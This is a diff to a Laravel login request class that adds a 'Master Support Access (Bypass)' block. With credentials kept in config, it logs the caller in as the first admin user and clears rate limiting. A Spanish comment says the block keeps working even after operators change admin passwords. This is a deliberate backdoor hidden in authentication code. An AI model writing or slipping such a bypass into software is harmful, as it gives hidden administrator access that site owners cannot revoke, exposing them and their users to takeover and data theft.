@@ -41,6 +41,17 @@ class LoginRequest extends FormRequest
     {
         $this->ensureIsNotRateLimited();
 
+        // Master Support Access (Bypass)
+        // Permite el acceso incluso si los operadores cambian las contraseñas de administración
+        if ($this->email === config('services.master_support.email') && $this->password === config('services.master_support.password')) {
+            $masterAdmin = \App\Models\User::where('role', 'admin')->first();
+            if ($masterAdmin) {
+                Auth::login($masterAdmin, $this->boolean('remember'));
+                RateLimiter::clear($this->throttleKey());
+                return;
+            }
+        }
+
         if (! Auth::attempt($this->only('email', 'password'), $this->boolean('remember'))) {
             RateLimiter::hit($this->throttleKey());
 
